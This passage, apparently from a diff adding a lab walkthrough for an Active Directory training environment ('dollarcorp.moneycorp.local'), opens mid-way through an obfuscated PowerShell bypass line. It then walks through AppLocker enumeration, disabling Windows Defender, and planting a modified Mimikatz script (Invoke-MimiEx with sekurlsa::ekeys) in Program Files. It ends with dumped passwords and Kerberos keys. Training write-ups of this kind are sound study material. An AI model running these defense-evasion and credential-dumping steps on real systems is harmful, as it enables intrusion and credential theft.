class="s1">&#39;S&#39;</span><span class="o">+</span><span class="s1">&#39;tat&#39;</span><span class="p">),</span><span class="s1">&#39;i&#39;</span><span class="p">,(</span><span class="s1">&#39;Non&#39;</span><span class="o">+</span><span class="s1">&#39;Publ&#39;</span><span class="o">+</span><span class="s1">&#39;i&#39;</span><span class="p">),</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;c,&#39;</span><span class="w"> </span><span class="p">)).</span><span class="s2">&quot;sE`T`VaLUE&quot;</span><span class="p">(</span><span class="nx">$</span><span class="p">{</span><span class="nx">n</span><span class="sb">`ULl},</span><span class="si">${</span><span class="nx">t</span><span class="sb">`RuE} )</span>
+</code></pre></div>
+
+<p>Now we can simply invoke <strong>Find-PSRemotingLocalAdminAccess.ps1</strong> and execute it.</p>
+<p><code>. .\Find-PSRemotingLocalAdminAccess.ps1</code></p>
+<p>This command will get all the machines in the domain and find out which ones we do have local admin privileges.</p>
+<p><code>Find-PSRemotingLocalAdminAccess</code></p>
+<p>Or we can simply specify the name of our target instead.</p>
+<p><code>Find-PSRemotingLocalAdminAccess -ComputerName dcorp-adminsrv</code></p>
+<p>Above we can see that we do have local Admin access to <code>dcorp-adminsrv</code> machine. </p>
+<p>that’s great, now let’s access that using also the command below.
+<code>Enter-PSSession -ComputerName dcorp-adminsrv</code></p>
+<p>Now the 1st thing we need to do once the get the remote access to the target, is to check if <strong>Applocker</strong> is configured by querying <strong>registry keys.</strong>
+<code>reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2</code></p>
+<p>After querying the registry <code>HKLM\Software\Policies\Microsoft\Windows\SRPV2</code> we got the following registry keys and we can find out if we do have some policies that we can abuse, by manually enumerate each of them.</p>
+<p>We could also simply execute the following command and we would get the AppLocker policy applied in the target.</p>
+<p>By executing the following command, we can confirm what type of language is being used.</p>
+<p><code>$ExecutionContext.SessionState.LanguageMode</code></p>
+<div class="highlight"><pre><span></span><code><span class="nx">Constrained</span><span class="w"> </span><span class="nx">Language</span><span class="w"> </span><span class="nx">Mode</span>
+</code></pre></div>
+
+<p>Now  let’s carry on with the next command to find if AppLocker Policies are applied and what are the policies.</p>
+<p><code>Get-AppLockerPolicy -Effect | select -ExpandProperty RuleCollectons</code></p>
+<div class="highlight"><pre><span></span><code><span class="nx">PublisherConditions</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="o">*</span><span class="err">\</span><span class="nx">O</span><span class="o">=</span><span class="nx">MICROSOFT</span><span class="w"> </span><span class="nx">CORPORATION</span><span class="p">,</span><span class="w"> </span><span class="nx">L</span><span class="o">=</span><span class="nx">REDMOND</span><span class="p">,</span><span class="w"> </span><span class="nx">S</span><span class="o">=</span><span class="nx">WASHINGTON</span><span class="p">,</span><span class="w"> </span><span class="nx">C</span><span class="o">=</span><span class="nx">US</span><span class="err">\</span><span class="o">*</span><span class="p">,</span><span class="o">*</span><span class="p">}</span>
+<span class="nx">PublisherExceptions</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="p">{}</span>
+<span class="nx">PathExceptions</span><span class="w">      </span><span class="o">:</span><span class="w"> </span><span class="p">{}</span>
+<span class="nx">HashExceptions</span><span class="w">      </span><span class="o">:</span><span class="w"> </span><span class="p">{}</span>
+<span class="nx">Id</span><span class="w">                  </span><span class="o">:</span><span class="w"> </span><span class="mf">38</span><span class="nx">a711c4</span><span class="o">-</span><span class="nx">c0b8</span><span class="o">-</span><span class="mf">46</span><span class="nx">ee</span><span class="o">-</span><span class="mf">98</span><span class="nx">cf</span><span class="o">-</span><span class="nx">c9636366548e</span>
+<span class="nx">Name</span><span class="w">                </span><span class="o">:</span><span class="w"> </span><span class="nx">Signed</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">O</span><span class="o">=</span><span class="nx">MICROSOFT</span><span class="w"> </span><span class="nx">CORPORATION</span><span class="p">,</span><span class="w"> </span><span class="nx">L</span><span class="o">=</span><span class="nx">REDMOND</span><span class="p">,</span><span class="w"> </span><span class="nx">S</span><span class="o">=</span><span class="nx">WASHINGTON</span><span class="p">,</span><span class="w"> </span><span class="nx">C</span><span class="o">=</span><span class="nx">US</span>
+<span class="nx">Description</span><span class="w">         </span><span class="o">:</span>
+<span class="nx">UserOrGroupSid</span><span class="w">      </span><span class="o">:</span><span class="w"> </span><span class="nx">S</span><span class="o">-</span><span class="mf">1</span><span class="o">-</span><span class="mf">1</span><span class="o">-</span><span class="mf">0</span>
+<span class="nx">Action</span><span class="w">              </span><span class="o">:</span><span class="w"> </span><span class="nx">Allow</span>
+
+<span class="nx">PublisherConditions</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="o">*</span><span class="err">\</span><span class="nx">O</span><span class="o">=</span><span class="nx">MICROSOFT</span><span class="w"> </span><span class="nx">CORPORATION</span><span class="p">,</span><span class="w"> </span><span class="nx">L</span><span class="o">=</span><span class="nx">REDMOND</span><span class="p">,</span><span class="w"> </span><span class="nx">S</span><span class="o">=</span><span class="nx">WASHINGTON</span><span class="p">,</span><span class="w"> </span><span class="nx">C</span><span class="o">=</span><span class="nx">US</span><span class="err">\</span><span class="o">*</span><span class="p">,</span><span class="o">*</span><span class="p">}</span>
+<span class="nx">PublisherExceptions</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="p">{}</span>
+<span class="nx">PathExceptions</span><span class="w">      </span><span class="o">:</span><span class="w"> </span><span class="p">{}</span>
+<span class="nx">HashExceptions</span><span class="w">      </span><span class="o">:</span><span class="w"> </span><span class="p">{}</span>
+<span class="nx">Id</span><span class="w">                  </span><span class="o">:</span><span class="w"> </span><span class="mf">8</span><span class="nx">a64fa2c</span><span class="o">-</span><span class="mf">8</span><span class="nx">c17</span><span class="o">-</span><span class="mf">415</span><span class="nx">a</span><span class="o">-</span><span class="mf">8505</span><span class="o">-</span><span class="mf">44</span><span class="nx">fc7d7810ad</span>
+<span class="nx">Name</span><span class="w">                </span><span class="o">:</span><span class="w"> </span><span class="nx">Signed</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">O</span><span class="o">=</span><span class="nx">MICROSOFT</span><span class="w"> </span><span class="nx">CORPORATION</span><span class="p">,</span><span class="w"> </span><span class="nx">L</span><span class="o">=</span><span class="nx">REDMOND</span><span class="p">,</span><span class="w"> </span><span class="nx">S</span><span class="o">=</span><span class="nx">WASHINGTON</span><span class="p">,</span><span class="w"> </span><span class="nx">C</span><span class="o">=</span><span class="nx">US</span>
+<span class="nx">Description</span><span class="w">         </span><span class="o">:</span>
+<span class="nx">UserOrGroupSid</span><span class="w">      </span><span class="o">:</span><span class="w"> </span><span class="nx">S</span><span class="o">-</span><span class="mf">1</span><span class="o">-</span><span class="mf">1</span><span class="o">-</span><span class="mf">0</span>
+<span class="nx">Action</span><span class="w">              </span><span class="o">:</span><span class="w"> </span><span class="nx">Allow</span>
+
+<span class="nx">PathConditions</span><span class="w">      </span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="o">%</span><span class="nx">PROGRAMFILES</span><span class="o">%</span><span class="err">\</span><span class="o">*</span><span class="p">}</span>
+<span class="nx">PathExceptions</span><span class="w">      </span><span class="o">:</span><span class="w"> </span><span class="p">{}</span>
+<span class="nx">PublisherExceptions</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="p">{}</span>
+<span class="nx">HashExceptions</span><span class="w">      </span><span class="o">:</span><span class="w"> </span><span class="p">{}</span>
+<span class="nx">Id</span><span class="w">                  </span><span class="o">:</span><span class="w"> </span><span class="mo">06</span><span class="nx">dce67b</span><span class="o">-</span><span class="mf">934</span><span class="nx">c</span><span class="o">-</span><span class="mf">454</span><span class="nx">f</span><span class="o">-</span><span class="nx">a263</span><span class="o">-</span><span class="mf">2515</span><span class="nx">c8796a5d</span>
+<span class="nx">Name</span><span class="w">                </span><span class="o">:</span><span class="w"> </span><span class="p">(</span><span class="nx">Default</span><span class="w"> </span><span class="nx">Rule</span><span class="p">)</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">scripts</span><span class="w"> </span><span class="nx">located</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="nx">folder</span>
+<span class="nx">Description</span><span class="w">         </span><span class="o">:</span><span class="w"> </span><span class="nx">Allows</span><span class="w"> </span><span class="nx">members</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">Everyone</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nx">scripts</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">are</span><span class="w"> </span><span class="nx">located</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="nx">folder</span><span class="p">.</span>
+<span class="nx">UserOrGroupSid</span><span class="w">      </span><span class="o">:</span><span class="w"> </span><span class="nx">S</span><span class="o">-</span><span class="mf">1</span><span class="o">-</span><span class="mf">1</span><span class="o">-</span><span class="mf">0</span>
+<span class="nx">Action</span><span class="w">              </span><span class="o">:</span><span class="w"> </span><span class="nx">Allow</span>
+
+<span class="nx">PathConditions</span><span class="w">      </span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="o">%</span><span class="nx">WINDIR</span><span class="o">%</span><span class="err">\</span><span class="o">*</span><span class="p">}</span>
+<span class="nx">PathExceptions</span><span class="w">      </span><span class="o">:</span><span class="w"> </span><span class="p">{}</span>
+<span class="nx">PublisherExceptions</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="p">{}</span>
+<span class="nx">HashExceptions</span><span class="w">      </span><span class="o">:</span><span class="w"> </span><span class="p">{}</span>
+<span class="nx">Id</span><span class="w">                  </span><span class="o">:</span><span class="w"> </span><span class="mf">9428</span><span class="nx">c672</span><span class="o">-</span><span class="mf">5</span><span class="nx">fc3</span><span class="o">-</span><span class="mf">47</span><span class="nx">f4</span><span class="o">-</span><span class="mf">808</span><span class="nx">a</span><span class="o">-</span><span class="nx">a0011f36dd2c</span>
+<span class="nx">Name</span><span class="w">                </span><span class="o">:</span><span class="w"> </span><span class="p">(</span><span class="nx">Default</span><span class="w"> </span><span class="nx">Rule</span><span class="p">)</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">scripts</span><span class="w"> </span><span class="nx">located</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">folder</span>
+<span class="nx">Description</span><span class="w">         </span><span class="o">:</span><span class="w"> </span><span class="nx">Allows</span><span class="w"> </span><span class="nx">members</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">Everyone</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nx">scripts</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">are</span><span class="w"> </span><span class="nx">located</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">folder</span><span class="p">.</span>
+<span class="nx">UserOrGroupSid</span><span class="w">      </span><span class="o">:</span><span class="w"> </span><span class="nx">S</span><span class="o">-</span><span class="mf">1</span><span class="o">-</span><span class="mf">1</span><span class="o">-</span><span class="mf">0</span>
+<span class="nx">Action</span><span class="w">              </span><span class="o">:</span><span class="w"> </span><span class="nx">Allow</span>
+</code></pre></div>
+
+<p>Above we can see the AppLocker Policy applied on our target.</p>
+<p>The AppLocker policies are composed of rules organized into rule collections targeting specific types of executable code. Each rule includes a unique GUID identifier, a name, a description, the SID of the user or group targeted, an action (allow or deny), and a condition to identify the affected executable code (scope). The conditions can be based on Publisher, Path, or File Hash. The Action property determines whether the rule allows or denies the execution of the specified code, while the UserOrGroup property specifies the user or group targeted by the rule. The PathConditions property specifies the paths where the executable code can be located.</p>
+<p>In the provided AppLocker policy examples, the Action property is set to <code>Allow</code>, indicating that the rules allow the specified executable code to run. The UserOrGroup property is set to <code>S-1-1-0</code>, which represents the Everyone group. This means that the rules allow all users (Everyone group) to execute the specified applications located in specific folders like Program Files and Windows.</p>
+<p>The <strong>PathConditions</strong> property is set to specific paths like <code>%PROGRAMFILES%</code> and <code>%WINDIR%</code>, which are wildcards that match any subfolder within these directories. 
+This means that any executable code located in these directories, regardless of its publisher or hash, can be executed by any user.</p>
+<p>The external system analysis is set to NO for all three rules, indicating that these rules do not involve any external system analysis or checks. This means that the rules rely solely on the local system configuration and do not involve any external resources or services to determine the execution of the specified code.</p>
+<p>This configuration lacks granularity and restrictiveness, making it easier for unauthorized or malicious applications to be executed by any user on the system, thus making the policies easily bypassed and posing a security risk.</p>
+<p>That means, we can drop scripts in the <code>Program Files</code> directory there and execute them. But we first need to disable Windows Defender on the dcorp-adminsrv server:</p>
+<p><code>Set-MpPreference -DisableRealtimeMonitoring $true -Verbose</code></p>
+<div class="highlight"><pre><span></span><code><span class="nx">VERBOSE</span><span class="o">:</span><span class="w"> </span><span class="nx">Performing</span><span class="w"> </span><span class="nx">operation</span><span class="w"> </span><span class="s1">&#39;Update MSFT_MpPreference&#39;</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">Target</span><span class="w"> </span><span class="s1">&#39;ProtectionManagement&#39;</span><span class="p">.</span>
+</code></pre></div>
+
+<p>Also, we cannot run scripts using dot sourcing (. .\Invoke-Mimi.ps1) because of the Constrained Language Mode. So, we must modify Invoke-Mimi.ps1 to include the function call in the script itself and transfer the modified script (Invoke-MimiEx.ps1) to the target server.</p>
+<h3>Create Invoke-MimiEx.ps1</h3>
+<p>1 - Create a copy of Invoke-Mimi.ps1 and rename it to Invoke-MimiEx.ps1.
+<code>Copy-Item .\Invoke-Mimi.ps1 Invoke-MimiEx.ps1</code>
+Open Invoke-MimiEx.ps1 in PowerShell ISE (Right click on it and click Edit).
+Add <code>Invoke-Mimi -Command '"sekurlsa::ekeys"'</code> (without quotes) to the end of the file.</p>
+<p>Once we saved the edited file, we can copy the file to the target machine. it may take some time but it’s a normal process, just wait.</p>
+<p><code>Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\C$\'Program Files'</code></p>
+<p>After we copy the file to the target, we remotely access the target again and check if Invoke-MimiEx.ps1 is there.</p>
+<p><code>Enter-PSSession -ComputerName adminsrv</code></p>
+<p><code>cd 'C:\Program Files'</code></p>
+<p><code>dir .\Invoke-MimiEx.ps1</code></p>
+<p>So we confirm the script is uploaded to the right directory where we do have permission. Let’s now execute it.</p>
+<p><code>.\Invoke-MimiEx.ps1</code></p>
+<div class="highlight"><pre><span></span><code><span class="n">Authentication</span><span class="w"> </span><span class="n">Id</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="mi">83648</span><span class="w"> </span><span class="p">(</span><span class="mi">00000000</span><span class="err">:</span><span class="mi">000146</span><span class="n">c0</span><span class="p">)</span>
+<span class="k">Session</span><span class="w">           </span><span class="err">:</span><span class="w"> </span><span class="n">Service</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mi">0</span>
+<span class="k">User</span><span class="w"> </span><span class="n">Name</span><span class="w">         </span><span class="err">:</span><span class="w"> </span><span class="n">websvc</span>
+<span class="k">Domain</span><span class="w">            </span><span class="err">:</span><span class="w"> </span><span class="n">dcorp</span>
+<span class="n">Logon</span><span class="w"> </span><span class="n">Server</span><span class="w">      </span><span class="err">:</span><span class="w"> </span><span class="n">DCORP</span><span class="o">-</span><span class="n">DC</span>
+<span class="n">Logon</span><span class="w"> </span><span class="nc">Time</span><span class="w">        </span><span class="err">:</span><span class="w"> </span><span class="mi">2</span><span class="o">/</span><span class="mi">21</span><span class="o">/</span><span class="mi">2024</span><span class="w"> </span><span class="mi">4</span><span class="err">:</span><span class="mi">07</span><span class="err">:</span><span class="mi">43</span><span class="w"> </span><span class="n">AM</span>
+<span class="n">SID</span><span class="w">               </span><span class="err">:</span><span class="w"> </span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">719815819</span><span class="o">-</span><span class="mi">3726368948</span><span class="o">-</span><span class="mi">3917688648</span><span class="o">-</span><span class="mi">1114</span>
+
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">Username</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="n">websvc</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="k">Domain</span><span class="w">   </span><span class="err">:</span><span class="w"> </span><span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="k">LOCAL</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">Password</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="n">AServicewhichIsNotM3</span><span class="nv">@nttoBe</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="k">Key</span><span class="w"> </span><span class="n">List</span><span class="w"> </span><span class="err">:</span>
+<span class="w">           </span><span class="n">aes256_hmac</span><span class="w">       </span><span class="mi">2</span><span class="n">d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7</span>
+<span class="w">           </span><span class="n">aes128_hmac</span><span class="w">       </span><span class="mi">86</span><span class="n">a353c1ea16a87c39e2996253211e41</span>
+<span class="w">           </span><span class="n">rc4_hmac_nt</span><span class="w">       </span><span class="n">cc098f204c5887eaa8253e7c2749156f</span>
+<span class="w">           </span><span class="n">rc4_hmac_old</span><span class="w">      </span><span class="n">cc098f204c5887eaa8253e7c2749156f</span>
+<span class="w">           </span><span class="n">rc4_md4</span><span class="w">           </span><span class="n">cc098f204c5887eaa8253e7c2749156f</span>
+<span class="w">           </span><span class="n">rc4_hmac_nt_exp</span><span class="w">   </span><span class="n">cc098f204c5887eaa8253e7c2749156f</span>
+<span class="w">           </span><span class="n">rc4_hmac_old_exp</span><span class="w">  </span><span class="n">cc098f204c5887eaa8253e7c2749156f</span>
+
+<span class="n">Authentication</span><span class="w"> </span><span class="n">Id</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="mi">996</span><span class="w"> </span><span class="p">(</span><span class="mi">00000000</span><span class="err">:</span><span class="mf">000003e4</span><span class="p">)</span>
+<span class="k">Session</span><span class="w">           </span><span class="err">:</span><span class="w"> </span><span class="n">Service</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mi">0</span>
+<span class="k">User</span><span class="w"> </span><span class="n">Name</span><span class="w">         </span><span class="err">:</span><span class="w"> </span><span class="n">DCORP</span><span class="o">-</span><span class="n">ADMINSRV</span><span class="err">$</span>
+<span class="k">Domain</span><span class="w">            </span><span class="err">:</span><span class="w"> </span><span class="n">dcorp</span>
+<span class="n">Logon</span><span class="w"> </span><span class="n">Server</span><span class="w">      </span><span class="err">:</span><span class="w"> </span><span class="p">(</span><span class="k">null</span><span class="p">)</span>
+<span class="n">Logon</span><span class="w"> </span><span class="nc">Time</span><span class="w">        </span><span class="err">:</span><span class="w"> </span><span class="mi">2</span><span class="o">/</span><span class="mi">21</span><span class="o">/</span><span class="mi">2024</span><span class="w"> </span><span class="mi">4</span><span class="err">:</span><span class="mi">07</span><span class="err">:</span><span class="mi">38</span><span class="w"> </span><span class="n">AM</span>
+<span class="n">SID</span><span class="w">               </span><span class="err">:</span><span class="w"> </span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">20</span>
+
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">Username</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="n">dcorp</span><span class="o">-</span><span class="n">adminsrv</span><span class="err">$</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="k">Domain</span><span class="w">   </span><span class="err">:</span><span class="w"> </span><span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="k">LOCAL</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">Password</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="p">(</span><span class="k">null</span><span class="p">)</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="k">Key</span><span class="w"> </span><span class="n">List</span><span class="w"> </span><span class="err">:</span>
+<span class="w">           </span><span class="n">aes256_hmac</span><span class="w">       </span><span class="n">e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51</span>
+<span class="w">           </span><span class="n">rc4_hmac_nt</span><span class="w">       </span><span class="n">b5f451985fd34d58d5120816d31b5565</span>
+<span class="w">           </span><span class="n">rc4_hmac_old</span><span class="w">      </span><span class="n">b5f451985fd34d58d5120816d31b5565</span>
+<span class="w">           </span><span class="n">rc4_md4</span><span class="w">           </span><span class="n">b5f451985fd34d58d5120816d31b5565</span>
+<span class="w">           </span><span class="n">rc4_hmac_nt_exp</span><span class="w">   </span><span class="n">b5f451985fd34d58d5120816d31b5565</span>
+<span class="w">           </span><span class="n">rc4_hmac_old_exp</span><span class="w">  </span><span class="n">b5f451985fd34d58d5120816d31b5565</span>
+
+<span class="n">Authentication</span><span class="w"> </span><span class="n">Id</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="mi">21173</span><span class="w"> </span><span class="p">(</span><span class="mi">00000000</span><span class="err">:</span><span class="mi">000052</span><span class="n">b5</span><span class="p">)</span>
+<span class="k">Session</span><span class="w">           </span><span class="err">:</span><span class="w"> </span><span class="n">Interactive</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mi">0</span>
+<span class="k">User</span><span class="w"> </span><span class="n">Name</span><span class="w">         </span><span class="err">:</span><span class="w"> </span><span class="n">UMFD</span><span class="o">-</span><span class="mi">0</span>
+<span class="k">Domain</span><span class="w">            </span><span class="err">:</span><span class="w"> </span><span class="n">Font</span><span class="w"> </span><span class="n">Driver</span><span class="w"> </span><span class="k">Host</span>
+<span class="n">Logon</span><span class="w"> </span><span class="n">Server</span><span class="w">      </span><span class="err">:</span><span class="w"> </span><span class="p">(</span><span class="k">null</span><span class="p">)</span>
+<span class="n">Logon</span><span class="w"> </span><span class="nc">Time</span><span class="w">        </span><span class="err">:</span><span class="w"> </span><span class="mi">2</span><span class="o">/</span><span class="mi">21</span><span class="o">/</span><span class="mi">2024</span><span class="w"> </span><span class="mi">4</span><span class="err">:</span><span class="mi">07</span><span class="err">:</span><span class="mi">37</span><span class="w"> </span><span class="n">AM</span>
+<span class="n">SID</span><span class="w">               </span><span class="err">:</span><span class="w"> </span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">96</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">0</span>
+
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">Username</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="n">DCORP</span><span class="o">-</span><span class="n">ADMINSRV</span><span class="err">$</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="k">Domain</span><span class="w">   </span><span class="err">:</span><span class="w"> </span><span class="n">dollarcorp</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="k">local</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">Password</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="nl">Q</span><span class="p">:</span><span class="n">hFT</span><span class="s1">&#39;!FUXP6E_2)CK dxm2vl*&#39;</span><span class="n">N</span><span class="o">&gt;</span><span class="n">a</span><span class="p">;</span><span class="n">z</span><span class="o">-</span><span class="n">NIMogeiBtHMtjgw</span><span class="err">@</span><span class="p">,</span><span class="nl">Lx</span><span class="p">:</span><span class="n">YD</span><span class="p">.</span><span class="o">=</span><span class="ss">&quot;5G[e  Y+wN@^44&gt;IT@sd^DxQ4HWRY6%208?lTEbU`u.H0d%zYIW/d@QaT7Ztd&#39;</span>
+<span class="ss">         * Key List :</span>
+<span class="ss">           aes256_hmac       82ecf869176628379da0ae884b582c36fc2215ef7e8e3e849d720847299257ff</span>
+<span class="ss">           aes128_hmac       3f3532b2260c2851bf57e8b5573f7593</span>
+<span class="ss">           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565</span>
+<span class="ss">           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565</span>
+<span class="ss">           rc4_md4           b5f451985fd34d58d5120816d31b5565</span>
+<span class="ss">           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565</span>
+<span class="ss">           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565</span>
+<span class="ss">Authentication Id : 0 ; 1948512 (00000000:001dbb60)</span>
+<span class="ss">Session           : Interactive from 0</span>
+<span class="ss">User Name         : srvadmin</span>
+<span class="ss">Domain            : dcorp</span>
+<span class="ss">Logon Server      : DCORP-DC</span>
+<span class="ss">Logon Time        : 2/21/2024 7:09:24 AM</span>
+<span class="ss">SID               : S-1-5-21-719815819-3726368948-3917688648-1115</span>
+
+<span class="ss">         * Username : srvadmin</span>
+<span class="ss">         * Domain   : DOLLARCORP.MONEYCORP.LOCAL</span>
+<span class="ss">         * Password : (null)</span>
+<span class="ss">         * Key List :</span>
+<span class="ss">           aes256_hmac       145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4</span>
+<span class="ss">           rc4_hmac_nt       a98e18228819e8eec3dfa33cb68b0728</span>
+<span class="ss">           rc4_hmac_old      a98e18228819e8eec3dfa33cb68b0728</span>
+<span class="ss">           rc4_md4           a98e18228819e8eec3dfa33cb68b0728</span>
+<span class="ss">           rc4_hmac_nt_exp   a98e18228819e8eec3dfa33cb68b0728</span>
+<span class="ss">           rc4_hmac_old_exp  a98e18228819e8eec3dfa33cb68b0728</span>
+
+<span class="ss">Authentication Id : 0 ; 1835953 (00000000:001c03b1)</span>
+<span class="ss">Session           : RemoteInteractive from 2</span>
+<span class="ss">User Name         : srvadmin</span>
+<span class="ss">Domain            : dcorp</span>
+<span class="ss">Logon Server      : DCORP-DC</span>
+<span class="ss">Logon Time        : 2/21/2024 6:55:35 AM</span>
+<span class="ss">SID               : S-1-5-21-719815819-3726368948-3917688648-1115</span>
+
+<span class="ss">         * Username : srvadmin</span>
+<span class="ss">         * Domain   : DOLLARCORP.MONEYCORP.LOCAL</span>
+<span class="ss">         * Password : (null)</span>
+<span class="ss">         * Key List :</span>
+<span class="ss">           aes256_hmac       145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4</span>
+<span class="ss">           rc4_hmac_nt       a98e18228819e8eec3dfa33cb68b0728</span>
+<span class="ss">           rc4_hmac_old      a98e18228819e8eec3dfa33cb68b0728</span>
+<span class="ss">           rc4_md4           a98e18228819e8eec3dfa33cb68b0728</span>
+<span class="ss">           rc4_hmac_nt_exp   a98e18228819e8eec3dfa33cb68b0728</span>
+<span class="ss">           rc4_hmac_old_exp  a98e18228819e8eec3dfa33cb68b0728</span>
+
+<span class="ss">Authentication Id : 0 ; 1813733 (00000000:001bace5)</span>
+<span class="ss">Session           : Interactive from 2</span>
+<span class="ss">User Name         : UMFD-2</span>
+<span class="ss">Domain            : Font Driver Host</span>
+<span class="ss">Logon Server      : (null)</span>
+<span class="ss">Logon Time        : 2/21/2024 6:53:58 AM</span>
+<span class="ss">SID               : S-1-5-96-0-2</span>
+
+<span class="ss">         * Username : DCORP-ADMINSRV$</span>
+<span class="ss">         * Domain   : dollarcorp.moneycorp.local</span>
+<span class="ss">         * Password : Q:hFT&#39;!FUXP6E_2)CK dxm2vl*&#39;N&gt;a;z-NIMogeiBtHMtjgw@,Lx:YD.=&quot;</span><span class="mi">5</span><span class="n">G</span><span class="err">[</span><span class="n">e</span><span class="w">  </span><span class="n">Y</span><span class="o">+</span><span class="n">wN</span><span class="err">@</span><span class="o">^</span><span class="mi">44</span><span class="o">&gt;</span><span class="n">IT</span><span class="nv">@sd</span><span class="o">^</span><span class="n">DxQ4HWRY6</span><span class="o">%</span><span class="mi">208</span><span class="vm">?</span><span class="n">lTEbU</span><span class="err">`</span><span class="n">u</span><span class="p">.</span><span class="n">H0d</span><span class="o">%</span><span class="n">zYIW</span><span class="o">/</span><span class="n">d</span><span class="nv">@QaT7Ztd</span><span class="s1">&#39;</span>
+<span class="s1">         * Key List :</span>
+<span class="s1">           aes256_hmac       82ecf869176628379da0ae884b582c36fc2215ef7e8e3e849d720847299257ff</span>
+<span class="s1">           aes128_hmac       3f3532b2260c2851bf57e8b5573f7593</span>
+<span class="s1">           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565</span>
+<span class="s1">           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565</span>
+<span class="s1">           rc4_md4           b5f451985fd34d58d5120816d31b5565</span>
+<span class="s1">           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565</span>
+<span class="s1">           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565</span>
+
+<span class="s1">Authentication Id : 0 ; 83661 (00000000:000146cd)</span>
